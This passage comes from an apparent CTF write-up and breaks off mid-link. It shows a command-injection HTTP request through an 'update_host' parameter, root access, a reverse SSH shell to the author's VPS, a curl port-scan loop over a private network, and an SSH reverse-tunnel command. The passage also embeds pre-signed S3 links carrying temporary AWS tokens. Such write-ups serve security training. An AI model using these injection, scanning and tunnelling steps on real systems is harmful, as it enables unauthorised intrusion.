noreferrer\"\u003e\u003cspan\u003ehttplib.py\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. This allowed me to easily submit more than 500 requests a second, the only problem now was not DoSing the server!\u003c/p\u003e\n\n\u003cp\u003eAfter a while the combined scripts identified the \u003ccode\u003eupdate_host\u003c/code\u003e parameter, which modified the host portion of the update function. With this and the \u003ccode\u003eport\u003c/code\u003e parameter I had complete control over the update destination. Pointing the \u003ccode\u003eupdate_host\u003c/code\u003e at a VPS I controlled, I expected to receive an HTTP request from the server, however no request was received. I tried IP addresses, encoded IP addresses, the localhost address, nothing seem to modify the result of the update function, the \u0026quot;Could not connect\u0026quot; error was always returned.\u003c/p\u003e\n\n\u003cp\u003eEventually I considered that the vulnerability may not be in the update request, but the parameter itself. Soon after this thought, I identified that the parameter was vulnerable to simple command injection using the \u003ccode\u003e$(\u0026lt;command\u0026gt;)\u003c/code\u003e sequence.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /update?update_host=$(echo+Hello+World)198.211.125.160\u0026amp;port=80 HTTP/1.1\nHost: 104.196.12.98\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://104.196.12.98/main\nConnection: close\nCookie: session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIJAHQ.604xiUcoHwNGwnR5oPQ7kq2Rmak\nUpgrade-Insecure-Requests: 1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis allowed me to move onto the next stage and attempt to further compromise the server.\u003c/p\u003e\n\n\u003ch4 id=\"tools\"\u003eTools\u003c/h4\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fajxchapman%2Fb7baca094e61ff120c44379029646b97%23file-wordlist_generator-py\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewordlist_generator.py\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fajxchapman%2Fb7baca094e61ff120c44379029646b97%23file-httplib-py\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttplib.py\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"summary-of-issues\"\u003eSummary of Issues:\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eNon-constant time credential comparison leading to authentication bypass\u003c/li\u003e\n\u003cli\u003eUnlisted query parameters accessible\u003c/li\u003e\n\u003cli\u003eCommand injection\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"stage-5-system-compromise\"\u003eStage 5 - System Compromise\u003c/h2\u003e\n\n\u003cp\u003eThe first thing I do when getting command injection is to identify the user the command is running as, in this case on a Linux server via the \u003ccode\u003eid\u003c/code\u003e command:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0\u003cspan class=\"o\"\u003e(\u003c/span\u003eroot\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nv\"\u003egid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0\u003cspan class=\"o\"\u003e(\u003c/span\u003eroot\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003egroups\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0\u003cspan class=\"o\"\u003e(\u003c/span\u003eroot\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWell that was easy, no need to go looking for privilege escalation issues in this instance.\u003c/p\u003e\n\n\u003cp\u003eIn order to assist in the assessment of the server I used my \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fajxchapman%2Fsshreverseshell\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSSHReverseShell\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e tool, creating new SSH keys on the server using the \u003ccode\u003essh-keygen\u003c/code\u003e command, and connecting a reverse ssh shell back to a VPS I controlled. This gave me secure full TTY shell on the compromised server with which to explore further. After finding few files of interest (barring the source code to the previous level of course \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"main_2.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/685/fe32b5b8d7c8b6e43a558e73eef574c6194a5545/main_2.py?response-content-disposition=attachment%3B%20filename%3D%22main_2.py%22%3B%20filename%2A%3DUTF-8%27%27main_2.py\u0026amp;response-content-type=text%2Fx-python\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=f5da345330f8b6c06159ba2be086551349cf8d9460503153e18512195d224ddb\" data-attachment-type=\"text/x-python\"\u003emain_2.py (F439685)\u003c/a\u003e), I went looking at the network.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003eip address\n1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\n    \u003cspan class=\"nb\"\u003elink\u003c/span\u003e/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n188: eth0@if189: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default\n    \u003cspan class=\"nb\"\u003elink\u003c/span\u003e/ether 02:42:ac:1b:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 172.27.0.3/16 brd 172.27.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis showed that the compromised host was on the \u003ccode\u003e172.27.0.3/16\u003c/code\u003e private network. Using \u003ccode\u003ecurl\u003c/code\u003e as a rudimentary portscanner I quickly found that I could only obviously route network traffic to 3 hosts in this network range. Further more I identified HTTP servers on all 3 of the routable hosts.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003efor \u003c/span\u003ei \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e1..255\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo for \u003c/span\u003ej \u003cspan class=\"k\"\u003ein \u003c/span\u003e22 80 443\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edo \u003c/span\u003e\u003cspan class=\"nv\"\u003eERROR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e$(\u003c/span\u003ecurl \u003cspan class=\"nt\"\u003e-sS\u003c/span\u003e 172.27.0.\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e:\u003cspan class=\"nv\"\u003e$j\u003c/span\u003e 2\u0026gt;\u0026amp;1 1\u0026gt;/dev/null\u003cspan class=\"si\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nt\"\u003e-e\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;172.27.0.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u003c/span\u003e\u003cspan class=\"nv\"\u003e$j\u003c/span\u003e\u003cspan class=\"se\"\u003e\\t\u003c/span\u003e\u003cspan class=\"k\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eERROR\u003c/span\u003e\u003cspan class=\"k\"\u003e:-\u003c/span\u003e\u003cspan class=\"nv\"\u003eOpen\u003c/span\u003e\u003cspan class=\"k\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edone\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003edone\n\n\u003c/span\u003e172.27.0.1:22   curl: \u003cspan class=\"o\"\u003e(\u003c/span\u003e56\u003cspan class=\"o\"\u003e)\u003c/span\u003e Recv failure: Connection reset by peer\n172.27.0.1:80   Open\n172.27.0.1:443  curl: \u003cspan class=\"o\"\u003e(\u003c/span\u003e7\u003cspan class=\"o\"\u003e)\u003c/span\u003e Failed to connect to 172.27.0.1 port 443: Connection refused\n172.27.0.2:22   curl: \u003cspan class=\"o\"\u003e(\u003c/span\u003e7\u003cspan class=\"o\"\u003e)\u003c/span\u003e Failed to connect to 172.27.0.2 port 22: Connection refused\n172.27.0.2:80   Open\n172.27.0.2:443  curl: \u003cspan class=\"o\"\u003e(\u003c/span\u003e7\u003cspan class=\"o\"\u003e)\u003c/span\u003e Failed to connect to 172.27.0.2 port 443: Connection refused\n172.27.0.3:22   curl: \u003cspan class=\"o\"\u003e(\u003c/span\u003e7\u003cspan class=\"o\"\u003e)\u003c/span\u003e Failed to connect to 172.27.0.3 port 22: Connection refused\n172.27.0.3:80   Open\n172.27.0.3:443  curl: \u003cspan class=\"o\"\u003e(\u003c/span\u003e7\u003cspan class=\"o\"\u003e)\u003c/span\u003e Failed to connect to 172.27.0.3 port 443: Connection refused\n172.27.0.4:22   curl: \u003cspan class=\"o\"\u003e(\u003c/span\u003e7\u003cspan class=\"o\"\u003e)\u003c/span\u003e Failed to connect to 172.27.0.4 port 22: No route to host\n172.27.0.4:80   curl: \u003cspan class=\"o\"\u003e(\u003c/span\u003e7\u003cspan class=\"o\"\u003e)\u003c/span\u003e Failed to connect to 172.27.0.4 port 80: No route to host\n172.27.0.4:443  curl: \u003cspan class=\"o\"\u003e(\u003c/span\u003e7\u003cspan class=\"o\"\u003e)\u003c/span\u003e Failed to connect to 172.27.0.4 port 443: No route to host\n172.27.0.5:22   curl: \u003cspan class=\"o\"\u003e(\u003c/span\u003e7\u003cspan class=\"o\"\u003e)\u003c/span\u003e Failed to connect to 172.27.0.5 port 22: No route to host\n172.27.0.5:80   curl: \u003cspan class=\"o\"\u003e(\u003c/span\u003e7\u003cspan class=\"o\"\u003e)\u003c/span\u003e Failed to connect to 172.27.0.5 port 80: No route to host\n172.27.0.5:443  curl: \u003cspan class=\"o\"\u003e(\u003c/span\u003e7\u003cspan class=\"o\"\u003e)\u003c/span\u003e Failed to connect to 172.27.0.5 port 443: No route to host\n172.27.0.6:22   curl: \u003cspan class=\"o\"\u003e(\u003c/span\u003e7\u003cspan class=\"o\"\u003e)\u003c/span\u003e Failed to connect to 172.27.0.6 port 22: No route to host\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"shell.gif\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/680/8080745b46e475661f27c11cb034f32af9749aac/shell.gif?response-content-disposition=attachment%3B%20filename%3D%22shell.gif%22%3B%20filename%2A%3DUTF-8%27%27shell.gif\u0026amp;response-content-type=image%2Fgif\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=a17130e72ac5d5b34d49221ee5432a63d55ab9d2798f79d752625054f90654d6\" data-attachment-type=\"image/gif\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/680/8080745b46e475661f27c11cb034f32af9749aac/shell.gif?response-content-disposition=attachment%3B%20filename%3D%22shell.gif%22%3B%20filename%2A%3DUTF-8%27%27shell.gif\u0026amp;response-content-type=image%2Fgif\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=a17130e72ac5d5b34d49221ee5432a63d55ab9d2798f79d752625054f90654d6\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eA quick check with \u003ccode\u003ecurl\u003c/code\u003e showed that the webservers on two of the IP addresses were pointing at the previous FliteThermostat Backend application, whilst the 3rd was hosting a new application, and the next stage of the CTF.\u003c/p\u003e\n\n\u003cp\u003eUsing SSH to reverse tunnel traffic through the compromised host to the new web server I could access the new application from my browser:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003essh \u003cspan class=\"nt\"\u003e-N\u003c/span\u003e \u003cspan class=\"nt\"\u003e-R\u003c/span\u003e 8001:172.27.0.2:80 \u003cspan class=\"nt\"\u003e-o\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;StrictHostKeyChecking no\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-o\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;UserKnownHostsFile /dev/null\u0026quot;\u003c/span\u003e \u0026lt;user\u0026gt;@\u0026lt;server\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"application.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/676/56bffd9ef1bb9c165010175dbbf23ab08e841add/application.png?response-content-disposition=attachment%3B%20filename%3D%22application.png%22%3B%20filename%2A%3DUTF-8%27%27application.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=b1e40a6ec870029c702c21e45a56abd6518cb49cfd5966b251a4909a20176ef8\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/676/56bffd9ef1bb9c165010175dbbf23ab08e841add/application.png?response-content-disposition=attachment%3B%20filename%3D%22application.png%22%3B%20filename%2A%3DUTF-8%27%27application.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=b1e40a6ec870029c702c21e45a56abd6518cb49cfd5966b251a4909a20176ef8\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch4 id=\"attachments\"\u003eAttachments\u003c/h4\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"main_2.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/685/fe32b5b8d7c8b6e43a558e73eef574c6194a5545/main_2.py?response-content-disposition=attachment%3B%20filename%3D%22main_2.py%22%3B%20filename%2A%3DUTF-8%27%27main_2.py\u0026amp;response-content-type=text%2Fx-python\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Ax